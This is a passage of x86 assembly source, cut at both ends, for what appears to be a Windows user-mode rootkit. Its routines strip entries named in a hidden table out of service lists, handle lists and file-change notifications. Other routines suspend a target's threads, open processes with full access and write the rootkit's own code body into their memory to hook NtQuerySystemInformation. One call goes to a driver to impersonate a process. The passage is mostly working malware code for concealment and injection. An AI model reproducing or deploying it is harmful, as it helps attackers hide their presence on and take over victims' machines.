  jmp @ProcessHandleInformationBuffer_main_loop_inc_counter
 @ProcessHandleInformationBuffer_main_loop_next:
  add esi,SYSTEM_HANDLE_INFORMATION_SIZE        //esi >> next record
 @ProcessHandleInformationBuffer_main_loop_inc_counter:
  inc dword ptr [ebp-018h]                      //LCounter++
  jmp @ProcessHandleInformationBuffer_main_loop
 @ProcessHandleInformationBuffer_main_loop_done:
  mov edx,[ebp-068h]                            //LWrittenHandlesCounter ++
  mov ecx,[ebp+008h]                            //ABuffer
  mov eax,[ecx]                                 //save original number of handles
  mov [ecx],edx
  sub eax,edx
  push 010h                                     //SYSTEM_HANDLE_INFORMATION_SIZE
  pop ecx
  mul ecx                                       //eax = (org handles count - written handles) * size
  mov ecx,eax
  xor eax,eax
  rep stosb                                     //erase next records

  mov ecx,[ebp+00Ch]                            //AReturnLength
  jecxz @ProcessHandleInformationBuffer_end
  push 010h                                     //SYSTEM_HANDLE_INFORMATION_SIZE
  pop edx
  mul edx
  mov [ecx],eax                                 //AReturnLength^ = 010h x LWrittenHandlesCounter

 @ProcessHandleInformationBuffer_end:
  pop edi
  pop esi
  leave
  ret 020h

 @ProcessEnumServiceStatus:
  push ebp
  mov ebp,esp
  sub esp,008h
  {
   -008         -       LExDif:Cardinal
   -004         -       LFileMappingAddr:Pointer
   +008         -       AServices:PEnumServiceStatusW
   +00C         -       AServicesReturned:Pointer
   +010         -       AEnumType:Cardinal

   TEnumType:
    ansi=0
    unicode=1
    ex=2

  }
  call @OpenFileMapping
  test eax,eax
  jz @ProcessEnumServiceStatus_end
  mov [ebp-004h],eax

  mov edi,eax
  add edi,[eax]                                 //edi >> RootProcessSize
  add edi,[edi]                                 //edi >> HiddenServicesSize
  add edi,004h                                  //edi >> HiddenServices

  mov eax,[ebp+010h]
  and eax,002h
  shl eax,002h
  mov [ebp-008h],eax

  mov esi,[ebp+008h]
  test esi,esi
  jz @ProcessEnumServiceStatus_CloseMapping

  mov ecx,[ebp+00Ch]
  mov ecx,[ecx]
  push edi
 @ProcessEnumServiceStatus_compare:
  mov al,[edi]
  test al,al
  jz @ProcessEnumServiceStatus_next_name

  mov eax,[esi]
  test eax,eax
  jz @ProcessEnumServiceStatus_aloop
  push ecx
  push esi
  mov esi,eax
  test dword ptr [ebp+010h],001h              //xange
  jnz @ProcessEnumServiceStatus_compare_unicode
  call @cmp2pchars_caseinsens_with_wildcard
  jmp @ProcessEnumServiceStatus_after_cmp
 @ProcessEnumServiceStatus_compare_unicode:
  call @cmp_wide_pchar_caseinsens_with_wildcard
 @ProcessEnumServiceStatus_after_cmp:
  test eax,eax
  jnz @ProcessEnumServiceStatus_found
  pop esi
  call @pchar_len
  pop ecx
  add edi,eax
  jmp @ProcessEnumServiceStatus_compare
 @ProcessEnumServiceStatus_next_name:
  pop edi
  push edi
  add esi, ENUM_SERVICE_STATUS_SIZE
  test dword ptr [ebp+010h], 2
  jz @ProcesssEnumServiceStatus_next
  add esi, 8
 @ProcesssEnumServiceStatus_next:

  loop @ProcessEnumServiceStatus_compare
 @ProcessEnumServiceStatus_aloop:
  pop edi
  jmp @ProcessEnumServiceStatus_CloseMapping

 @ProcessEnumServiceStatus_found:
  pop esi
  pop ecx
  cmp ecx,001h
  jz @ProcessEnumServiceStatus_lastitem
  push ecx
  push esi
  push edi
  dec ecx                                       //we will copy all next records without current
  mov edi,esi                                   //current record will be rewritten
  push dword ptr [ebp-008h]                     //bug_fix_00000001
  add dword ptr [esp],ENUM_SERVICE_STATUS_SIZE  //bug_fix_00000001
 @ProcesssEnumServiceStatus_found_next:
  pop eax                                       //is size of one
  add esi,eax                                   //first will be next record
  mul ecx                                       //multiplied by number of records
  mov ecx,eax
  rep movsb                                     //current record is rewritten
  xor eax,eax
  push dword ptr [ebp-008h]                     //bug_fix_00000001
  add dword ptr [esp],ENUM_SERVICE_STATUS_SIZE  //bug_fix_00000001

  pop ecx
  rep stosb                                     //and the last one should be deleted
  pop edi
  pop esi
  pop ecx
  jmp @ProcessEnumServiceStatus_subcounter
 @ProcessEnumServiceStatus_lastitem:
  xor eax,eax
  mov [esi],eax
  mov [esi+004h],eax
 @ProcessEnumServiceStatus_subcounter:
  mov eax,[ebp+00Ch]
  dec dword ptr [eax]
  mov eax,[eax]
  test eax,eax
  jnz @ProcessEnumServiceStatus_prevrec
  push ERROR_MORE_DATA
  call [ebx+@SetLastErrorAddr]
  jmp @ProcessEnumServiceStatus_next_name
 @ProcessEnumServiceStatus_prevrec:
  sub esi,ENUM_SERVICE_STATUS_SIZE
  sub esi,[ebp-008h]                            //bug_fix_00000001
  jmp @ProcessEnumServiceStatus_next_name

 @ProcessEnumServiceStatus_CloseMapping:
  push dword ptr [ebp-004h]
  call @CloseFileMapping
 @ProcessEnumServiceStatus_end:
  xor eax,eax
  mov edx,[ebp+00Ch]
  test edx,edx
  jz @ProcessEnumServiceStatus_end_2
  mov edx,[edx]
  test edx,edx
  setnz al
 @ProcessEnumServiceStatus_end_2:
  leave
  ret 00Ch

 @CheckFileObjectAttributes:                            //check ObjectAttributes.ObjectName
                                                        //against Hidden Table
                                                        //return 0 if name is not in table
                                                        //return 1 otherwise
  push ebp
  mov ebp,esp
  sub esp,00200h
  {
   -0200..-0100 -       LBuffer:array of Char      
   -00C         -       LFileName:Pointer
   -008         -       LFileMappingAddr:Pointer
   -004         -       LResult:Cardinal
   +008         -       AObjectAttributes:PObjectAttributes
  }
  push esi
  push edi
  push 000h
  pop dword ptr [ebp-004h]

  mov esi,[ebp+008h]                            //AObjectAttributes
  test esi,esi
  jz @CheckFileObjectAttributes_end
  mov esi,[esi+008h]                            //AObjectAttributes.ObjectName
  test esi,esi
  jz @CheckFileObjectAttributes_end
  mov edi,[esi+004h]                            //AObjectAttributes.ObjectName.Buffer
  test edi,edi
  jz @CheckFileObjectAttributes_end
  mov [ebp-00Ch],edi                            //LFileName
  movzx ecx,word ptr [esi]
  add edi,ecx                                   //to the end of file name
  shr ecx,001h                                  //wcharlen to pcharlen
 @CheckFileObjectAttributes_copy_loop:
  mov edx,ecx
  push 05Ch                                     //"\"
  pop eax
  std                                           //go backwards
  repnz scasw
  cld
  jnz @CheckFileObjectAttributes_copy_name
  add edi,004h
  dec edx
  dec edx
 @CheckFileObjectAttributes_copy_name:
  lea esi,[ebp-00200h]
  xchg esi,edi
  sub edx,ecx
  jnb @CheckFileObjectAttributes_do_copy
  inc ecx
  xchg edi,esi
  dec edi
  dec edi
  mov word ptr [edi],000h                       //last char was "\"
  jmp @CheckFileObjectAttributes_copy_loop
 @CheckFileObjectAttributes_do_copy:
  xchg ecx,edx
  rep movsw                                     //copy file name to local buffer
  mov word ptr [edi],000h                       //trailing zero

  call @OpenFileMapping
  test eax,eax
  jz @CheckFileObjectAttributes_end
  mov [ebp-008h],eax                            //LFileMappingAddr
  mov edi,eax
  push FMP_HIDDEN_TABLE                         //AConstNumber
  call @GetFileMappingConst
  lea esi,[ebp-00200h]                          //LBuffer

 @CheckFileObjectAttributes_filecmp:
  movzx eax,byte ptr [edi]
  test eax,eax
  jz @CheckFileObjectAttributes_CloseMapping
  call @cmp_wide_pchar_caseinsens_with_wildcard
  test eax,eax
  jnz @CheckFileObjectAttributes_Found
  call @pchar_len
  add edi,eax
  jmp @CheckFileObjectAttributes_filecmp
 @CheckFileObjectAttributes_Found:
  mov [ebp-004h],eax                            //LResult
 @CheckFileObjectAttributes_CloseMapping:
  push dword ptr [ebp-008h]                     //LFileMappingAddr
  call @CloseFileMapping
 @CheckFileObjectAttributes_end:
  mov eax,[ebp-004h]                            //LResult
  pop edi
  pop esi
  leave
  ret 004h


 @Notify_call_directory_by_entry:
  pop edx                                       //ret
  pop eax                                       //entry
  push edx
  push esi

  lea esi,[eax+020h]                            //entry.args[8]
  std                                           //go backwards
  push 009h                                     //number of args
  pop ecx
 @Notify_call_directory_by_entry_push_loop:
  lodsd                                         //load arg
  push eax                                      //push it
  loop @Notify_call_directory_by_entry_push_loop
  cld                                           //restore flags
  call @Safety_NtNotifyChangeDirectoryFile
  pop esi
  ret                                           //from push edx

 @Notify_CheckHandle:
  push ebp
  mov ebp,esp
  sub esp,00400h
  {
   -0400..-0200 -       LBuffer:array of Char
   -014         -       LFInfo:PFileNotifyInformation
   -010         -       LHiddenTable:Pointer
   -00C         -       LEntry:Pointer
   -008         -       LMapping:Pointer
   -004         -       LResult:Pointer
   +008         -       AHandle:THandle
  }
  push esi
  push edi
  xor eax,eax
  mov [ebp-004h],eax                    //LResult
  mov [ebp-018h],eax                    //LPrevFInfo

  call @Notify_EnterCriticalSection

  push dword ptr [ebp+008h]             //AHandle
  call @Notify_GetTableEntryAddress
  mov esi,eax                           //save entry address

  mov eax,[esi]                         //entry.argv[0]
  test eax,eax
  jz @Notify_CheckHandle_leave_critical_section
  mov [ebp-00Ch],esi                    //LEntry

  call @OpenFileMapping
  test eax,eax
  jz @Notify_CheckHandle_leave_critical_section
  mov [ebp-008h],eax                    //LMapping

  mov edi,eax
  push FMP_HIDDEN_TABLE                 //AConstNumber
  call @GetFileMappingConst
  mov [ebp-010h],edi                    //LHiddenTable

  mov eax,[ebp-00Ch]                    //LEntry
  mov eax,[eax+014h]                    //LEntry.args[5] (Buffer)
  mov [ebp-014h],eax                    //LFInfo
 @Notify_CheckHandle_loop:
  mov eax,[ebp-014h]                    //LFInfo
  lea edi,[eax+00Ch]                    //LFInfo.Name
  mov ecx,[eax+008h]                    //LFInfo.NameLenght
  add edi,ecx                           //end of name
  shr ecx,001h                          //wchar_len to pchar_len
  mov edx,ecx
  movzx eax,word ptr [edi]              //save word after name
  push eax
  xor eax,eax
  mov [edi],ax                          //null word after name
  push 05Ch                             //"\"
  pop eax
  std                                   //go backwards
  repnz scasw
  cld
  jnz @Notify_CheckHandle_copy_name
  add edi,004h
  dec edx
  dec edx
 @Notify_CheckHandle_copy_name:
  mov esi,edi
  sub edx,ecx
  xchg ecx,edx
  lea edi,[ebp-00400h]                  //LBuffer
  push edi
  rep movsw
  mov word ptr [edi],000h               //trailing zero
  mov edi,esi
  pop esi
  pop eax
  mov word ptr [edi],ax                 //restore word after name

  mov edi,[ebp-010h]                    //LHiddenTable
 @Notify_CheckHandle_filecmp:
  movzx eax,byte ptr [edi]
  test eax,eax
  jz @Notify_CheckHandle_next
  call @cmp_wide_pchar_caseinsens_with_wildcard
  test eax,eax
  jnz @Notify_CheckHandle_found
  call @pchar_len
  add edi,eax
  jmp @Notify_CheckHandle_filecmp
 @Notify_CheckHandle_found:
  mov eax,[ebp-014h]                    //LFInfo
  mov ecx,[eax]                         //LFInfo.NextEntryOffset
  jecxz @Notify_CheckHandle_last
  mov edi,[ebp-014h]                    //LFInfo
  lea esi,[edi+ecx]                     //next record
  mov edx,[ebp-00Ch]                    //LEntry
  mov ecx,[edx+018h]                    //LEntry.args[6] (BufferLength)
  sub ecx,esi                           //- LFInfo
  add ecx,edi                           //+ LEntry
  // BufferSize - (LFInfo - LEntry) = Size
  rep movsb
  jmp @Notify_CheckHandle_loop

 @Notify_CheckHandle_last:
  mov ecx,[ebp-018h]                    //LPrevFInfo
  jecxz @Notify_CheckHandle_result
  xor eax,eax
  mov [ecx],eax                         //LPrevFInfo.NextEntryOffset
  mov edi,[ebp-014h]                    //LFInfo
  mov edx,[ebp-00Ch]                    //LEntry
  mov ecx,[edx+018h]                    //LEntry.args[6] (BufferLength)
  mov esi,[edx+014h]                    //LEntry.args[5] (BufferLength)
  sub ecx,edi                           //- LFInfo
  add ecx,esi                           //+ LEntry
  // BufferSize - (LPrevFInfo - LEntry) = Size
  rep stosb
  jmp @Notify_CheckHandle_remove
 @Notify_CheckHandle_next:
  mov eax,[ebp-014h]                    //LFInfo
  mov ecx,[eax]                         //LFInfo.NextEntryOffset
  jecxz @Notify_CheckHandle_remove
  mov [ebp-018h],eax                    //LPrevFInfo = LFInfo
  add eax,ecx
  mov [ebp-014h],eax
  jmp @Notify_CheckHandle_loop

 @Notify_CheckHandle_remove:
  mov eax,[ebp-00Ch]                    //LEntry
  push 000h
  pop dword ptr [eax]
  jmp @Notify_CheckHandle_CloseMapping
 @Notify_CheckHandle_result:
  mov eax,[ebp-00Ch]                    //LEntry
  mov [ebp-004h],eax                    //LResult
 @Notify_CheckHandle_CloseMapping:
  push dword ptr [ebp-008h]             //LMapping
  call @CloseFileMapping
 @Notify_CheckHandle_leave_critical_section:
  call @Notify_LeaveCriticalSection
  mov eax,[ebp-004h]
  pop edi
  pop esi
  leave
  ret 004h

 @Notify_EnterCriticalSection:
  //waits and goes to criticalsession, return hash table ptr
 @Notify_EnterCriticalSection_wait:
  push 001h
  call @Sleep
  mov al,[ebx+@LCriticalSectionFlag]
  test al,al
  jnz @Notify_EnterCriticalSection_wait
  setz dl
  lock cmpxchg byte ptr [ebx+@LCriticalSectionFlag],dl
  jnz @Notify_EnterCriticalSection_wait
  ret

 @Notify_LeaveCriticalSection:
  or al,-001h
  lock xadd byte ptr [ebx+@LCriticalSectionFlag],al
  ret

 @Notify_GetTableEntryAddress:
  mov eax,[esp+004h]                    //AKey
  push NOTIFY_TABLE_ENTRY_SIZE
  pop ecx
  cdq
  mul ecx                               //eax = AKey * NOTIFY_TABLE_ENTRY_SIZE
  add eax,[ebx+@LNotifyTable]
  ret 004h

 @Notify_AddHashEntry:
  push ebp
  mov ebp,esp
  {
   +008         -       AKey:DWORD
   +00C         -       AEntry:THashEntry
  }
  push esi
  push edi

  call @Notify_EnterCriticalSection

  push dword ptr [ebp+008h]             //AKey
  call @Notify_GetTableEntryAddress

  push NOTIFY_TABLE_ENTRY_SIZE/4
  pop ecx
  mov esi,[ebp+00Ch]                    //AEntry
  mov edi,eax
  rep movsd

  call @Notify_LeaveCriticalSection
 @Notify_AddHashEntry_end:
  pop edi
  pop esi
  leave
  ret 008h


 @GetCurrentProcessId:
  mov eax,fs:[000000018h]
  mov eax,[eax+020h]
  ret

 @GetCurrentProcess:
  or eax,-001h
  ret


 @RehookMe:
  push ebp
  mov ebp,esp
  sub esp,004h
  {
   -004         -       LCounter:Cardinal
  }
  push esi
 @RehookMe_check:
  mov al,[ebx+@LGlobalCheck]
  test al,al
  jnz @RehookMe_end
  setz dl
  lock cmpxchg byte ptr [ebx+@LGlobalCheck],dl
  jnz @RehookMe_end

  call @GetCurrentProcessId
  push 001h                                     //HookType = htRehook
  push eax                                      //PID
  call @HookProcess


 @RehookMe_end:
  pop esi
  leave
  ret

 @GetCurrentThreadId:
  mov eax,fs:[018h]
  mov eax,[eax+024h]
  ret

 @SuspendProcess:
  push ebp
  mov ebp,esp
  sub esp,02Ch
  {
   -02C..-018   -       LObjectAttr:TObjectAttributes
   -014         -       LThreadHandle:THandle;
   -010         -       LClientId.UniqueProcess
   -00C         -       LClientId.UniqueThread
   -008         -       LProcessTable:Pointer
   -004         -       LCounter:Cardinal
   +008         -       APID:Cardinal
   +00C         -       AHookType:Cardinal
                                = 0 = htNewProcess
                                = 1 = htRehook = don't suspend current thread
  }
  push esi
  push edi

  xor edi,edi
  push 018h
  pop dword ptr [ebp-02Ch]
  mov [ebp-028h],edi
  mov [ebp-024h],edi
  mov [ebp-020h],edi
  mov [ebp-01Ch],edi
  mov [ebp-018h],edi

  push 005h                                     //ATableType = SystemProcessesAndThreadsInformation
  call @GetInfoTable
  test eax,eax
  jz @SuspendProcess_end
  mov [ebp-008h],eax
 @SuspendProcess_find_process:
  mov edx,[eax+044h]                            //PID
  cmp edx,[ebp+008h]                            //APID
  jz @SuspendProcess_threads
  cmp [eax],edi
  jz @SuspendProcess_freemem
  add eax,[eax]
  jmp @SuspendProcess_find_process

 @SuspendProcess_threads:
  mov edi,[eax+004h]                            //ThreadsCount
  lea esi,[eax+0B8h]                            //Threads

 @SuspendProcess_threads_loop:
  mov eax,[esi+020h]                            //ClientId.UniqueProcess
  mov [ebp-010h],eax                            //LClientId.UniqueProcess
  mov eax,[esi+024h]                            //ClientId.UniqueThread
  mov [ebp-00Ch],eax                            //LClientId.UniqueThread

  cmp [ebp+00Ch],001h                           //AHookType
  jnz @SuspendProcess_threads_open_process
  mov ecx,eax
  call @GetCurrentThreadId
  cmp eax,ecx
  jz @SuspendProcess_threads_next

 @SuspendProcess_threads_open_process:
  lea eax,[ebp-010h]
  push eax                                      //ClientId
  lea eax,[ebp-02Ch]
  push eax                                      //ObjectAttributes
  push 002h                                     //DesiredAccess = THREAD_SUSPEND_RESUME
  lea eax,[ebp-014h]
  push eax                                      //ThreadHandle
  call [ebx+@NtOpenThreadAddr]
  test eax,eax
  jnz @SuspendProcess_freemem

  push 000h
  push dword ptr [ebp-014h]
  call [ebx+@NtSuspendThreadAddr]

 {$IFDEF LOGGING}
  {$IF Logging_Level=1}
  push eax
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData1a]                      //to
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp+008h]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData1b]                      //suspending thread
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp-00Ch]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData1c]                      //method
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp+00Ch]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData1d]                      //result
  push eax
  call @LogPChar_without_length
  pop eax
  push eax
  push 001h
  push eax
  call @LogIntAsString
  pop eax
  {$IFEND}
 {$ENDIF}

  push dword ptr [ebp-014h]
  call [ebx+@NtCloseAddr]
 @SuspendProcess_threads_next:
  add esi,040h                                  //SYSTEM_THREADS_SIZE
  dec edi
  jnz @SuspendProcess_threads_loop

 @SuspendProcess_freemem:
  push dword ptr [ebp-008h]
  call @LocalFreeMem
 @SuspendProcess_end:
  pop edi
  pop esi
  leave
  ret 008h

 @ResumeProcess:
  push ebp
  mov ebp,esp
  sub esp,02Ch
  {
   -02C..-018   -       LObjectAttr:TObjectAttributes
   -014         -       LThreadHandle:THandle;
   -010         -       LClientId.UniqueProcess
   -00C         -       LClientId.UniqueThread
   -008         -       LProcessTable:Pointer
   -004         -       LCounter:Cardinal
   +008         -       APID:Cardinal
  }
  push esi
  push edi

  xor edi,edi
  push 018h
  pop dword ptr [ebp-02Ch]
  mov [ebp-028h],edi
  mov [ebp-024h],edi
  mov [ebp-020h],edi
  mov [ebp-01Ch],edi
  mov [ebp-018h],edi

  push 005h                                     //ATableType = SystemProcessesAndThreadsInformation
  call @GetInfoTable
  test eax,eax
  jz @ResumeProcess_end
  mov [ebp-008h],eax
 @ResumeProcess_find_process:
  mov edx,[eax+044h]                            //PID
  cmp edx,[ebp+008h]
  jz @ResumeProcess_threads
  cmp [eax],edi
  jz @ResumeProcess_freemem
  add eax,[eax]
  jmp @ResumeProcess_find_process

 @ResumeProcess_threads:
  mov edi,[eax+004h]                            //ThreadsCount
  lea esi,[eax+0B8h]                            //Threads

 @ResumeProcess_threads_loop:
  mov eax,[esi+020h]                            //ClientId.UniqueProcess
  mov [ebp-010h],eax                            //LClientId.UniqueProcess
  mov eax,[esi+024h]                            //ClientId.UniqueThread
  mov [ebp-00Ch],eax                            //LClientId.UniqueThread

  lea eax,[ebp-010h]
  push eax                                      //ClientId
  lea eax,[ebp-02Ch]
  push eax                                      //ObjectAttributes
  push 002h                                     //DesiredAccess = THREAD_SUSPEND_RESUME
  lea eax,[ebp-014h]
  push eax                                      //ThreadHandle
  call [ebx+@NtOpenThreadAddr]
  test eax,eax
  jnz @ResumeProcess_freemem

  push 000h
  push dword ptr [ebp-014h]
  call @Safety_NtResumeThread
  push dword ptr [ebp-014h]
  call [ebx+@NtCloseAddr]
  add esi,040h                                  //SYSTEM_THREADS_SIZE
  dec edi
  jnz @ResumeProcess_threads_loop

 @ResumeProcess_freemem:
  push dword ptr [ebp-008h]
  call @LocalFreeMem
 @ResumeProcess_end:
  pop edi
  pop esi
  leave
  ret 004h

 @MakeRootProcess:
  push ebp
  mov ebp,esp
  sub esp,014h
  {
   -014..-010   -       LIoStatusBlock:IO_STATUS_BLOCK
   -00C         -       LDIBImpersonateProcess.TargetProcess
   -008         -       LDIBImpersonateProcess.SystemProcess
   -004         -       LResult:Boolean | LDOBImpersonateProcess.Status
   +008         -       APID:Cardinal
  }
  push edi
  push 000h
  pop dword ptr [ebp-004h]

  mov eax,[ebp+008h]
  mov [ebp-00Ch],eax                            //LDIBImpersonateProcess.TargetProcess
  mov eax,[ebx+@cMainProcessPID]
  mov [ebp-008h],eax                            //LDIBImpersonateProcess.SystemProcess

  call @OpenDriver
  test eax,eax
  jz @MakeRootProcess_end
  mov edi,eax

  push 004h                                     //OutputBufferLength
  lea eax,[ebp-004h]
  push eax                                      //OutputBuffer = LDOBNameString
  push 008h                                     //InputBufferLength
  lea eax,[ebp-00Ch]
  push eax                                      //InputBuffer = LDIBNameString
  push 000222004h                               //IoControlCode = IOCTL_IMPERSONATE_PROCESS
  lea eax,[ebp-014h]
  push eax                                      //IoStatusBlock
  push 000h                                     //ApcContext
  push 000h                                     //ApcRoutine
  push 000h                                     //Event
  push edi                                      //FileHandle = ADriverHandle
  call @Safety_NtDeviceIoControlFile
//  call @HT_OldNtDeviceIoControlFile

  push edi
  call [ebx+@NtCloseAddr]
 @MakeRootProcess_end:
  mov eax,[ebp-004h]
  pop esi
  pop edi
  leave
  ret 004h

 @GetFileMappingConst:                          //returns pointer on specific FMP item to edi
                                                //AConstNumber on stack
                                                //FileMappingAddr in edi
  pop eax                                       //ret
  pop ecx                                       //AConstNumber
  jecxz @GetFileMappingConst_end
 @GetFileMappingConst_loop:
  add edi,[edi]
  loop @GetFileMappingConst_loop
 @GetFileMappingConst_end:
  add edi,004h
  push eax
  ret

 @HookProcess:
  push ebp
  mov ebp,esp
  sub esp,06Ch
  {
   -06C         -       LModuleList:Pointer
   -068         -       LModuleListBuf.Next
   -064         -       LModuleListBuf.Prev
   -060         -       LModuleListBuf.ImageBase
   -05C         -       LModuleListBuf.ImageEntry
   -058         -       LModuleListBuf.ImageSize
   -054         -       LData:Pointer
   -050..-03C   -       LProcessBasicInformation:TProcessBasicInformation
   -038..-034   -       LPID:CLIENT_ID
   -030..-01C   -       LObjectAttr:TObjectAttributes
   -018         -       LHookedFlags:Pointer
   -014         -       LCounter1:Cardinal
   -010         -       LBytes:Cardinal
   -00C         -       LVAllocAddr:Pointer
   -008         -       LProcessHandle:Cardinal
   -004         -       LResult:Boolean
   +008         -       APID:Cardinal
   +00C         -       AHookType:Cardinal
                                = 0 = htNewProcess
                                = 1 = htRehook

  }
  push edi
  push esi

 {$IFDEF LOGGING}
  {$IF Logging_Level=1}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData2a]
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp+008h]                     //APID
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData2b]                      //method
  push eax
  call @LogPChar_without_length
  push 001h
  push dword ptr [ebp+00Ch]                     //AHookType
  call @LogIntAsString
  {$IFEND}
 {$ENDIF}


  xor edi,edi
  mov [ebp-004h],edi
  mov [ebp-008h],edi
  mov [ebp-034h],edi
  push 018h
  pop dword ptr [ebp-030h]
  mov [ebp-02Ch],edi
  mov [ebp-028h],edi
  mov [ebp-024h],edi
  mov [ebp-020h],edi
  mov [ebp-01Ch],edi
  mov [ebp-06Ch],edi

  push 001h                                             //ctRootProcess
  push dword ptr [ebp+008h]                             //APID
  call @CheckProcess
  test eax,eax
  jz @HookProcess_no_root_process

  cmp dword ptr [ebp+00Ch],000h                         //htNewProcess
  jnz @HookProcess_end
  push dword ptr [ebp+008h]                             //APID
  call @MakeRootProcess
  jmp @HookProcess_end

 @HookProcess_no_root_process:
  cmp dword ptr [ebp+00Ch],001h                 //htRehook
  jnz @HookProcess_GetProcessHandle
  call @GetCurrentProcess
  mov esi,eax
  mov [ebp-008h],esi
  lea edi,[ebx+@HookedFlags]
  mov [ebp-018h],edi
  lea eax,[ebx+@Body]
  mov [ebp-00Ch],eax                            //LVAllocAddr
  jmp @HookProcess_PreHook

 @HookProcess_GetProcessHandle:
  lea eax,[ebp-038h]
  push dword ptr [ebp+008h]                     //APID
  pop dword ptr [eax]
  mov [eax+004h],edi
  push eax                                      //ClientId
  lea eax,[ebp-030h]
  push eax                                      //ObjectAttributes
  push 0001F0FFFh                               //DesiredAccess = PROCESS_ALL_ACCESS
  lea eax,[ebp-008h]
  push eax                                      //ProcessHandle
  call @Safety_NtOpenProcess

 {$IFDEF LOGGING}
  {$IF Logging_Level=1}

  push eax
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData4a]                      //open process
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp+008h]                     //APID
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData4b]                      //handle
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp-008h]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData4c]                      //result
  push eax
  call @LogPChar_without_length
  pop eax
  push eax
  push 001h
  push eax
  call @LogIntAsString
  pop eax
  {$IFEND}
 {$ENDIF}

  test eax,eax
  jnz @HookProcess_end
  mov esi,[ebp-008h]

 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7a]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString

  {$IFEND}
 {$ENDIF}


  push 000h                                     //ReturnLength
  push 001h                                     //BufferLength
  lea eax,[ebp-014h]
  push eax                                      //Buffer
  push dword ptr [ebx+@NtQuerySystemInformationAddr] //BaseAddress
                                                //this should be hooked everywhere
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @HookProcess_close_proc_handle
  mov al,[ebp-014h]
  cmp al,0E9h                                   //check if already hooked
  jz @HookProcess_close_proc_handle

  lea edx,[ebx+@Body]
  lea ecx,[ebx+@Body_ending]
  sub ecx,edx
  mov [ebp-010h],ecx

  push ecx                                      //Size
  push esi                                      //ProcessHandle
  call @GlobalAllocMem

  test eax,eax
  jz @HookProcess_close_proc_handle
  mov [ebp-00Ch],eax
  mov edi,eax

  push 000h                                     //ReturnLength
  push dword ptr [ebp-010h]                     //BufferLength
  lea edx,[ebx+@Body]
  push edx                                      //Buffer
  push eax                                      //BaseAddress
  push esi                                      //ProcessHandle
  call [ebx+@NtWriteVirtualMemoryAddr]

  test eax,eax
  jnz @HookProcess_free

  push HooksCount
  call @LocalAllocMem
  test eax,eax
  jz @HookProcess_free
  mov [ebp-018h],eax
  mov edi,eax
  xor eax,eax
  push HooksCount
  pop ecx
  rep stosb

 @HookProcess_PreHook:
  cmp [ebp+00Ch],000h                           //AHookType = htNewProcess
  jz @HookProcess_Hook
  push 000h                                     //ReturnLenght
  push 018h                                     //ProcessInformationLength
  lea eax,[ebp-050h]
  push eax                                      //ProcessInformation
  push 000h                                     //ProcessInformationClass=ProcessBasicInformation
  push esi                                      //ProcessHandle
  call [ebx+@NtQueryInformationProcessAddr]

 {$IFDEF LOGGING}
  {$IF Logging_Level=1}
  push eax
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData5a]                      //getting peb from
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp+008h]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData5b]                      //peb
  push eax
  call @LogPChar_without_length
  push 000h
  push dword ptr [ebp-04Ch]
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData5c]                      //result
  push eax
  call @LogPChar_without_length
  pop eax
  push eax
  push 001h
  push eax
  call @LogIntAsString
  pop eax
  {$IFEND}
 {$ENDIF}


 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7b]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString

  {$IFEND}
 {$ENDIF}

  test eax,eax
  jnz @HookProcess_free
  mov eax,[ebp-04Ch]
  add eax,00Ch                                  //take PPEB_LDR_DATA
  push 000h                                     //ReturnLength
  push 004h                                     //BufferLength
  lea ecx,[ebp-054h]
  push ecx                                      //Buffer
  push eax                                      //BaseAddress
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @HookProcess_free
 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7c]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString

  {$IFEND}
 {$ENDIF}

  mov eax,[ebp-054h]
  add eax,01Ch                                  //take PPEB_LDR_DATA.InInitializationOrderModuleList
  push 000h                                     //ReturnLength
  push 004h                                     //BufferLength
  lea ecx,[ebp-054h]
  push ecx                                      //Buffer
  push eax                                      //BaseAddress
  push esi                                      //ProcessHandle
  call @Safety_NtReadVirtualMemory
  test eax,eax
  jnz @HookProcess_free
  xor edi,edi
  mov eax,[ebp-054h]
  mov [ebp-068h],eax

 {$IFDEF LOGGING}
  {$IF Logging_Level=2}
  push 000h
  call @GetCurrentProcessId
  push eax
  call @LogIntAsString
  push 000h
  lea eax,[ebx+@LogData7d]
  push eax
  call @LogPChar_without_length
  push 001h
  push esp
  call @LogIntAsString

  {$IFEND}
 {$ENDIF}

 @HookProcess_CountModules_loop:
  inc edi
  push 000h                                     //ReturnLength
  push 004h                                     //BufferLength
